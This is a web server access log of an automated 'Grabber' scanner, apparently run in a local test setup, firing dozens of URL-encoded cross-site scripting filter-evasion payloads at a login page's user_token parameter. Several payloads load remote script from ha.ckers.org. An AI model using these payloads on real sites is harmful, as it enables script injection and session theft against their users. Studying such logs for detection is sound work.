172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CBODY+onload%21%23%24%25%26%28%29%2A%7E%2B-_.%2C%3A%3B%3F%40%5B%2F%7C%5C%5D%5E%60%3Dalert%28%22XSS%22%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A%00075%00072%0006C%00028%27%0006a%00061%00076%00061%00073%00063%00072%00069%00070%00074%0003a%00061%0006c%00065%00072%00074%00028.1027%00058.1053%00053%00027%00029%27%00029%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22Set-Cookie%22+Content%3D%22USERID%3D%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /?user_token=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:39 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3C%21--%5Bif+gte+IE+4%5D%3E+%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C%2FSCRIPT%3E+%3C%21%5Bendif%5D--%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2Fha.ckers.org%40google%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22%2F%2Fgoogle%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CHEAD%3E%3CMETA+HTTP-EQUIV%3D%22CONTENT-TYPE%22+CONTENT%3D%22text%2Fhtml%3B+charset%3DUTF-7%22%3E+%3C%2FHEAD%3E%2BADw-SCRIPT%2BAD4-alert%28%27XSS%27%29%3B%2BADw-%2FSCRIPT%2BAD4- HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3D%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2339%3B%26%2388%3B%26%2383%3B%26%2383%3B%26%2339%3B%26%2341%3B%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F0102.0146.0007.00000223%2F%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /?user_token=%3CA+HREF%3D%22http%3A%2F%2F%2577%2577%2577%252E%2567%256F%256F%2567%256C%2565%252E%2563%256F%256D%22%3EXSS%3C%2FA%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:40 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?user_token=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /?user_token=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:21:41 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
